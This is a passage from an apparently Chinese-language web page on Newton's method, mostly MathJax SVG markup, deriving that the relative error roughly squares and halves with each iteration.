442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span> 为 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.33ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4565.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1294.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1683.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2405.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(3405.9,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mi" transform="translate(477,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4176.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>。将其代入牛顿法的迭代公式，经过推导得到： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.148ex;" xmlns="http://www.w3.org/2000/svg" width="44.21ex" height="5.737ex" role="img" focusable="false" viewBox="0 -1586.1 19541 2535.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(1722.4,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="TeXAtom" transform="translate(477,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3674.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(4730.6,0)"><g data-mml-node="mn" transform="translate(220,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g><g data-mml-node="mrow" transform="translate(5670.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M701 -940Q701 -943 695 -949H664Q662 -947 636 -922T591 -879T537 -818T475 -737T412 -636T350 -511T295 -362T250 -186T221 17T209 251Q209 962 573 1361Q596 1386 616 1405T649 1437T664 1450H695Q701 1444 701 1441Q701 1436 681 1415T629 1356T557 1261T476 1118T400 927T340 675T308 359Q306 321 306 250Q306 -139 400 -430T690 -924Q701 -936 701 -940Z"></path></g><g data-mml-node="mn" transform="translate(736,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1458.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(2458.4,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(1722.4,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mi" transform="translate(477,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(1722.4,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mi" transform="translate(477,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><rect width="2693.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(5391.8,0) translate(0 -0.5)"><path data-c="29" d="M34 1438Q34 1446 37 1448T50 1450H56H71Q73 1448 99 1423T144 1380T198 1319T260 1238T323 1137T385 1013T440 864T485 688T514 485T526 251Q526 134 519 53Q472 -519 162 -860Q139 -885 119 -904T86 -936T71 -949H56Q43 -949 39 -947T34 -937Q88 -883 140 -813Q428 -430 428 251Q428 453 402 628T338 922T245 1146T145 1309T46 1425Q44 1427 42 1429T39 1433T36 1436L34 1438Z"></path></g></g><g data-mml-node="mo" transform="translate(12076.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(13132,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(13854.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(14854.5,0)"><g data-mml-node="msubsup" transform="translate(220,752.2)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mn" transform="translate(477,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(477,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mn" transform="translate(410.3,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="1080.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(16397.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(17397.5,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mo" transform="translate(17882.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(18271.5,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mn" transform="translate(477,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(477,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(19152,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 这表示误差大约在每次迭代时平方并减半。</p>
<p><strong>误差的平方</strong></p>
<p>从上面的公式可以得出： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="17.409ex" height="5.141ex" role="img" focusable="false" viewBox="0 -1586.1 7694.7 2272.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="TeXAtom" transform="translate(477,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1952.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3008.2,0)"><g data-mml-node="msubsup" transform="translate(220,752.2)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mn" transform="translate(477,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(477,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mn" transform="translate(410.3,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="1080.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4551,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(5551.2,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mo" transform="translate(6036.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(6425.2,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mn" transform="translate(477,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(477,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 